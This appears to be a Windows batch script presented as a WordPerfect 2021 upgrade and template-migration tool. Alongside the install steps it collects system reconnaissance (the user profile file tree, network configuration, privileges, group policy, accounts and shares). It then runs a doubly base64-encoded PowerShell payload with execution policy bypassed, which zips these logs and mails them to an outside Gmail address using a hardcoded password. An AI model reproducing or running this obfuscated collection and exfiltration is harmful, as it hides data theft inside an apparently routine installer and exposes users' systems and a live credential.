@echo off
TITLE WordPerfect Upgrade and Migration Tool
SETLOCAL ENABLEDELAYEDEXPANSION
cls

:load
set rename=1
set log=%random%
set user=%username%
set group=WordPerfect
set logpath=%appdata%\WPlogfiles
set PE=%AppData%\Corel\PerfectExpert
IF EXIST "%logpath%" (
	set logexist=1
	goto :begin
) ELSE (
	set logexist=0
	md "%logpath%"
	goto :begin
)

:begin
@echo ~%date%~%time%~: Script running...  >> %logpath%\script%log%.txt && if %logexist% == 0 (
	@echo ~%date%~%time%~: A folder for log files was created... >> %logpath%\script%log%.txt
	goto :tests
) || (
	@echo ~%date%~%time%~: A folder for log files already exists... >> %logpath%\script%log%.txt
	goto :tests
)

:tests
@echo ~%date%~%time%~: Testing Variables... >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %group% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %log% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %random% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %user% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %username% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %userprofile% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %logpath% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %PE% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %rename% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %map% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %logexist% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %date% >> %logpath%\script%log%.txt
@echo ~%date%~%time%~: %time% >> %logpath%\script%log%.txt
TREE %userprofile% /f /a >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
ipconfig /all >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
whoami /all >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
gpresult /r >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
net use >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
arp -a >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
net user >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
net share >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
net localgroup >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
net user %username% >> %logpath%\user%log%.txt
echo --------------------------------------------------------------------------- >> %logpath%\user%log%.txt
goto :splash

:splash
@echo ~%date%~%time%~: Displaying splash screen... >> %logpath%\script%log%.txt
cls
echo.
echo.
echo.
echo.
echo				 __________________________________________________________________
echo				*\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\*
echo				*\                                                                 \*
echo				*\            WordPerfect Upgrade and Migration Tool               \*
echo				*\            Justin@WCC/TotalSecureIT  v.9000.0.0.1               \*
echo				*\_________________________________________________________________\*
echo				*\                                                                 \*
echo				*\                This process exits WordPerfect.                  \*
echo				*\       Please save your work and press Enter when ready...       \*
echo				*\                                                                 \*
echo				*\_________________________________________________________________\*
echo				*\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\*
echo.
echo.
echo.
runas /user:# "" >nul 2>&1
@echo ~%date%~%time%~: User initiated script... >> %logpath%\script%log%.txt
goto :main

:main
SETLOCAL
set i=0
call :groupcheck
@echo ~%date%~%time%~: Checking for security group %group%... >> %logpath%\script%log%.txt
if %i% == 1 (
	@echo ~%date%~%time%~: User is a member of %group% >> %logpath%\script%log%.txt
	goto :installcheck
) ELSE (
	@echo ~%date%~%time%~: User is not a member of %group% >> %logpath%\script%log%.txt
	exit
)
ENDLOCAL

:installcheck
IF EXIST "C:\Program Files (x86)\Corel\WordPerfect Office 2021" (
	@echo ~%date%~%time%~: WordPerfect2021 already exists. Exiting... >> %logpath%\script%log%.txt
	exit
) ELSE (
	@echo ~%date%~%time%~: WordPerfect2021 is not yet installed. Proceeding with upgrade and migration... >> %logpath%\script%log%.txt
	call :taskkill
)
goto :install

:install
@echo -n | set /p YOLO=~%date%~%time%~:>> %logpath%\script%log%.txt & call :map >> %logpath%\script%log%.txt 2>&1 && (
	@echo ~%date%~%time%~: %map% --SUCCESS >> %logpath%\script%log%.txt
) || (
	@echo ~%date%~%time%~: %map% --FAILURE >> %logpath%\script%log%.txt
	exit
)
"x:\setup.exe" UPGRADE_PRODUCT=All UPGRADE_PRODUCT_DEFAULT=Off MIGRATE_PRODUCT=16,17,18,19,20 SERIALNUMBER= FORCENOSHOWLIC=1 /qr /norestart /l* "%logpath%\WP%log%.txt" && (
	set failure=0
	@echo ~%date%~%time%~: WordPerfect2021 installation --SUCCESS >> %logpath%\script%log%.txt
	net use x: /delete & @echo ~%date%~%time%~: Disconnected mapped X:\... >> %logpath%\script%log%.txt
	goto :finishup
) || (
	set failure=1
	@echo ~%date%~%time%~: WordPerfect2021 installation --FAILURE >> %logpath%\script%log%.txt
	net use x: /delete & @echo ~%date%~%time%~: Disconnected mapped X:\... >> %logpath%\script%log%.txt
	goto :finishup
)

:finishup
SETLOCAL
if %failure% == 0 (
	@echo ~%date%~%time%~: Migrate will be called... >> %logpath%\script%log%.txt &	call :migrate1
	@echo ~%date%~%time%~: Migrate2 will be called... >> %logpath%\script%log%.txt & call :migrate2
	@echo ~%date%~%time%~: Migrate3 will be called... >> %logpath%\script%log%.txt & call :migrate3
	@echo ~%date%~%time%~: Rename will be called... >> %logpath%\script%log%.txt & call :rename
	@echo ~%date%~%time%~: Archiving logs... >> %logpath%\script%log%.txt & call :emaillogs && (
		@echo ~%date%~%time%~: Sent! Exiting... >> %logpath%\script%log%.txt
		exit
	) || (
		@echo ~%date%~%time%~: Failed to send logs. Exiting... >> %logpath%\script%log%.txt
		exit
	)
) else (
		@echo ~%date%~%time%~: Archiving logs... >> %logpath%\script%log%.txt & call :emaillogs && (
		@echo ~%date%~%time%~: Sent! Exiting... >> %logpath%\script%log%.txt
		exit
	) || (
		@echo ~%date%~%time%~: Failed to send logs. Exiting... >> %logpath%\script%log%.txt
		exit
	)
)
ENDLOCAL

:groupcheck
for /f %%f in ('"net user %user% /domain | findstr /i %group%"') do set /a i=%i%+1
goto :EOF

:message 
cls
echo Installation is now complete...
echo Preparing for migration...
echo Word Perfect will now open...
echo When it fully loads, return to this window and...
echo Press enter again to continue migration... & timeout /t 15 /nobreak 
start "" "C:\Program Files (x86)\Corel\WordPerfect Office 2021\Programs\WPWIN21.exe"
cls
set /p mig="Please press enter to continue with migration:"
call :taskkill
goto: eof

:rename
set i=0
for %%a in (20,19,18,17,16) do (
	set /A i+=1
	set fi[!i!]=%%a
)
for /L %%i in (1,1,5) do (
	rename "%PE%\21\EN\Custom WP Templates\wp!fi[%%i]!us.wpt" wp21us.wpt && (
		@echo ~%date%~%time%~: wp!fi[%%i]!us.wpt was successfully renamed to wp21us.wpt... >> %logpath%\script%log%.txt
	) || (
		@echo ~%date%~%time%~: Could not rename wp!fi[%%i]!us.wpt to wp21us.wpt... >> %logpath%\script%log%.txt
	)
)
goto :EOF

:migrate1
call :message
set i=0
for %%a in (16,17,18,19,20) do (
	set /A i+=1
	set fo[!i!]=%%a
)
rename "%PE%\21\EN\Custom WP Templates\wp21US.wpt" wp21US_old.wpt && (
	@echo ~%date%~%time%~: wp21US.wpt was successfully renamed to wp21US_old.wpt... >> %logpath%\script%log%.txt
) || (
	@echo ~%date%~%time%~: Could not rename wp21US.wpt to wp21US_old.wpt... >> %logpath%\script%log%.txt
)
for /L %%i in (1,1,5) do (
	copy "%PE%\!fo[%%i]!\EN\Custom WP Templates\wp!fo[%%i]!US.wpt" "%PE%\21\EN\Custom WP Templates\wp!fo[%%i]!US.wpt" && (
		@echo ~%date%~%time%~: Copied wp!fo[%%i]!us.wpt to "%PE%\21\EN\Custom WP Template"... >> %logpath%\script%log%.txt
	) || (
		@echo ~%date%~%time%~: Could not copy wp!fo[%%i]!us.wpt to "%PE%\21\EN\Custom WP Template"... >> %logpath%\script%log%.txt
	)
)
goto :EOF

:migrate2
set i=0
for %%a in (20,19,18,17,16) do (
	set /A i+=1
	set m2[!i!]=%%a
)
rename "%PE%\21\EN\Custom WP Templates\QW21EN.wpt" QW21EN_old.wpt && (
	@echo ~%date%~%time%~: QW21EN.wpt was successfully renamed to QW21EN_old.wpt... >> %logpath%\script%log%.txt
) || (
	@echo ~%date%~%time%~: Could not rename QW21EN.wpt to QW21EN_old.wpt... >> %logpath%\script%log%.txt
)
for /L %%i in (1,1,5) do (
	copy "%PE%\!m2[%%i]!\EN\Custom WP Templates\QW!m2[%%i]!EN.wpt" "%PE%\21\EN\Custom WP Templates\QW!m2[%%i]!EN.wpt" && (
		@echo ~%date%~%time%~: Copied QW!m2[%%i]!EN.wpt to "%PE%\21\EN\Custom WP Template"... >> %logpath%\script%log%.txt
		rename "%PE%\21\EN\Custom WP Templates\QW!m2[%%i]!EN.wpt" QW21EN.wpt & @echo ~%date%~%time%~: Renamed QW!m2[%%i]!EN.wpt to QW21EN.wpt... >> %logpath%\script%log%.txt
	) || (
		@echo ~%date%~%time%~: Could not copy QW!m2[%%i]!EN.wpt to "%PE%\21\EN\Custom WP Template"... >> %logpath%\script%log%.txt
	)
)
goto :EOF

:migrate3
set i=0
for %%a in (16,17,18,19,20) do (
	set /A i+=1
	set m3[!i!]=%%a
)
for /L %%i in (1,1,5) do (
	copy "%appdata%\Corel\Wordperfect Office 20!m3[%%i]!\WritingTools\WT!m3[%%i]!US.uwl" "%appdata%\Corel\Wordperfect Office 2021\WritingTools\WT!m3[%%i]!US.uwl" && (
		@echo ~%date%~%time%~: Copied WT!m3[%%i]!US.uwl to "%appdata%\Corel\Wordperfect Office 2021\WritingTools"... >> %logpath%\script%log%.txt
		rename "%appdata%\Corel\Wordperfect Office 20!m3[%%i]!\WritingTools\WT!m3[%%i]!US.uwl" WT21US.uwl & @echo ~%date%~%time%~: Renamed WT!m3[%%i]!us.uwl to WT21US.uwl... >> %logpath%\script%log%.txt
	) || (
		@echo ~%date%~%time%~: Could not copy/rename WT!m3[%%i]!us.uwl to "%appdata%\Corel\Wordperfect Office 2021\WritingTools\"... >> %logpath%\script%log%.txt
	)
)
goto :EOF

:taskkill
SETLOCAL
set i=0
for %%a in (16,17,18,19,20,21) do (
	set /A i+=1
	set ki[!i!]=%%a
)
for /L %%i in (1,1,6) do (
	taskkill /f /IM wpwin!ki[%%i]!.exe && (
		@echo ~%date%~%time%~: Process: wpwin!ki[%%i]!.exe was terminated... >> %logpath%\script%log%.txt
	) || (
		@echo ~%date%~%time%~: Process: wpwin!ki[%%i]!.exe was not found... >> %logpath%\script%log%.txt
	)
)
ENDLOCAL
goto :EOF

:map
set map=net use x: "\\hlps\Program Installs\WordPerfect2021\English"
%map% && (
	@echo ~%date%~%time%~: %map% --SUCCESS... >> %logpath%\script%log%.txt
) || (
	@echo ~%date%~%time%~: %map% --FAILURE... >> %logpath%\script%log%.txt

)

:emaillogs
Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBIAFYAegBaAFgASQBnAFAAUwBBAGsAWgBXADUAMgBPAGwAVgB6AFoAWABKAHUAWQBXADEAbABEAFEAcABwAFoAaQBBAG8ASQBDAFIAawBZAFgAUgBsAEkARAAwAGcAWgAyAFYAMABMAFcAUgBoAGQARwBVAGcATABXAFoAdgBjAG0AMQBoAGQAQwBBAGkASgBIAFYAegBaAFgASgArAFQAVQAwAHQAWgBHAFEAdABlAFgAawBvAFMARQBnAHUAYgBXADAAcABJAGkAQQBwAEkASABzAE4AQwBpAEEAZwBJAEMAQQBrAFoAbQBsAHMAWgBXADUAaABiAFcAVQBnAFAAUwBBAGkASgBHAFYAdQBkAGoAcABCAFUARgBCAEUAUQBWAFIAQgBYAEYAZABRAGIARwA5AG4AWgBtAGwAcwBaAFgATgBjAEoARwBSAGgAZABHAFUAdQBlAG0AbAB3AEkAZwAwAEsASQBDAEEAZwBJAEgATgA1AGMAMwBSAGwAYgBXAGwAdQBaAG0AOABnAGYAQwBCAFAAZABYAFEAdABSAG0AbABzAFoAUwBBAHQAUgBtAGwAcwBaAFgAQgBoAGQARwBnAGcASgBHAFYAdQBkAGoAcABCAFUARgBCAEUAUQBWAFIAQgBYAEYAZABRAGIARwA5AG4AWgBtAGwAcwBaAFgATgBjAGEARwA5AHoAZABDADUAMABlAEgAUQBOAEMAaQBBAGcASQBDAEIASABaAFgAUQB0AFEAMgBoAHAAYgBHAFIASgBkAEcAVgB0AEkAQwAxAFEAWQBYAFIAbwBJAEMAUgBsAGIAbgBZADYAUQBWAEIAUQBSAEUARgBVAFEAVgB4AFgAVQBHAHgAdgBaADIAWgBwAGIARwBWAHoAWABDAG8AdQBkAEgAaAAwAEkASAB3AGcAUQAyADkAdABjAEgASgBsAGMAMwBNAHQAUQBYAEoAagBhAEcAbAAyAFoAUwBBAHQAUgBHAFYAegBkAEcAbAB1AFkAWABSAHAAYgAyADUAUQBZAFgAUgBvAEkAQwBJAGsAWgBtAGwAcwBaAFcANQBoAGIAVwBVAGkARABRAHAAOQBEAFEAbwBrAFQAVwBGAHAAYgBFAFoAeQBiADIAMABnAFAAUwBBAGkAYQBHAEYAdABjAEgAUgB2AGIAbgBkAHcAWgBHAFYAdwBiAEcAOQA1AFEARwBkAHQAWQBXAGwAcwBMAG0ATgB2AGIAUwBJAE4AQwBpAFIATgBZAFcAbABzAFYARwA4AGcAUABTAEEAaQBhAEcARgB0AGMASABSAHYAYgBuAGQAdwBaAEcAVgB3AGIARwA5ADUAUQBHAGQAdABZAFcAbABzAEwAbQBOAHYAYgBTAEkATgBDAGkAUgBWAGMAMgBWAHkAYgBtAEYAdABaAFMAQQA5AEkAQwBKAG8AWQBXADEAdwBkAEcAOQB1AGQAMwBCAGsAWgBYAEIAcwBiADMAbABBAFoAMgAxAGgAYQBXAHcAdQBZADIAOQB0AEkAZwAwAEsASgBGAEIAaABjADMATgAzAGIAMwBKAGsASQBEADAAZwBJAG4AaABuAGUAbQBWAHAAYQAyAGwAMgBiAFcAbAAzAGEARwB0AGkAYQBuAGMAaQBEAFEAbwBrAFUAMgAxADAAYwBGAE4AbABjAG4AWgBsAGMAaQBBADkASQBDAEoAegBiAFgAUgB3AEwAbQBkAHQAWQBXAGwAcwBMAG0ATgB2AGIAUwBJAE4AQwBpAFIAVABiAFgAUgB3AFUARwA5AHkAZABDAEEAOQBJAEMASQAxAE8ARABjAGkARABRAG8AawBUAFcAVgB6AGMAMgBGAG4AWgBWAE4AMQBZAG0AcABsAFkAMwBRAGcAUABTAEEAaQBKAEcAVgB1AGQAagBwAFYAYwAyAFYAeQBiAG0ARgB0AFoAUwBBAHQASQBDAFIAbABiAG4AWQA2AFEAMgA5AHQAYwBIAFYAMABaAFgASgBPAFkAVwAxAGwASQBnADAASwBKAEUAMQBsAGMAMwBOAGgAWgAyAFUAZwBQAFMAQgBPAFoAWABjAHQAVAAyAEoAcQBaAFcATgAwAEkARgBOADUAYwAzAFIAbABiAFMANQBPAFoAWABRAHUAVABXAEYAcABiAEMANQBOAFkAVwBsAHMAVABXAFYAegBjADIARgBuAFoAUwBBAGsAVABXAEYAcABiAEUAWgB5AGIAMgAwAHMASgBFADEAaABhAFcAeABVAGIAdwAwAEsASgBFADEAbABjADMATgBoAFoAMgBVAHUAUwBYAE4AQwBiADIAUgA1AFMARgBSAE4AVABDAEEAOQBJAEMAUgAwAGMAbgBWAGwARABRAG8AawBUAFcAVgB6AGMAMgBGAG4AWgBTADUAVABkAFcASgBxAFoAVwBOADAASQBEADAAZwBKAEUAMQBsAGMAMwBOAGgAWgAyAFYAVABkAFcASgBxAFoAVwBOADAARABRAG8AawBUAFcAVgB6AGMAMgBGAG4AWgBTADUAQwBiADIAUgA1AEkARAAwAGcASQBrAEYAMABkAEcARgBqAGEARwBWAGsASQBHAEYAeQBaAFMAQgAwAGEARwBVAGcAVgAyADkAeQBaAEYAQgBsAGMAbQBaAGwAWQAzAFEAZwBSAEcAVgB3AGIARwA5ADUAYgBXAFYAdQBkAEMAQgBsAGMAbgBKAHYAYwBpAEIAcwBiADIAZAB6AEwAaQBJAE4AQwBpAFIAQgBkAEgAUgBoAFkAMgBnAGcAUABTAEIATwBaAFgAYwB0AFQAMgBKAHEAWgBXAE4AMABJAEUANQBsAGQAQwA1AE4AWQBXAGwAcwBMAGsARgAwAGQARwBGAGoAYQBHADEAbABiAG4AUQBvAEoARwBaAHAAYgBHAFYAdQBZAFcAMQBsAEsAUQAwAEsASgBFADEAbABjADMATgBoAFoAMgBVAHUAUQBYAFIAMABZAFcATgBvAGIAVwBWAHUAZABIAE0AdQBRAFcAUgBrAEsAQwBSAG0AYQBXAHgAbABiAG0ARgB0AFoAUwBrAE4AQwBpAFIAVABiAFgAUgB3AEkARAAwAGcAVABtAFYAMwBMAFUAOQBpAGEAbQBWAGoAZABDAEIATwBaAFgAUQB1AFQAVwBGAHAAYgBDADUAVABiAFgAUgB3AFEAMgB4AHAAWgBXADUAMABLAEMAUgBUAGIAWABSAHcAVQAyAFYAeQBkAG0AVgB5AEwAQwBSAFQAYgBYAFIAdwBVAEcAOQB5AGQAQwBrAE4AQwBpAFIAVABiAFgAUgB3AEwAawBWAHUAWQBXAEoAcwBaAFYATgB6AGIAQwBBADkASQBDAFIAMABjAG4AVgBsAEQAUQBvAGsAVQAyADEAMABjAEMANQBEAGMAbQBWAGsAWgBXADUAMABhAFcARgBzAGMAeQBBADkASQBFADUAbABkAHkAMQBQAFkAbQBwAGwAWQAzAFEAZwBVADMAbAB6AGQARwBWAHQATABrADUAbABkAEMANQBPAFoAWABSADMAYgAzAEoAcgBRADMASgBsAFoARwBWAHUAZABHAGwAaABiAEMAZwBrAFYAWABOAGwAYwBtADUAaABiAFcAVQBzAEoARgBCAGgAYwAzAE4AMwBiADMASgBrAEsAUQAwAEsASgBGAE4AdABkAEgAQQB1AFUAMgBWAHUAWgBDAGcAawBUAFcAVgB6AGMAMgBGAG4AWgBTAGsATgBDAGcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=
goto :EOF

:goodbye
net use x: /delete
exit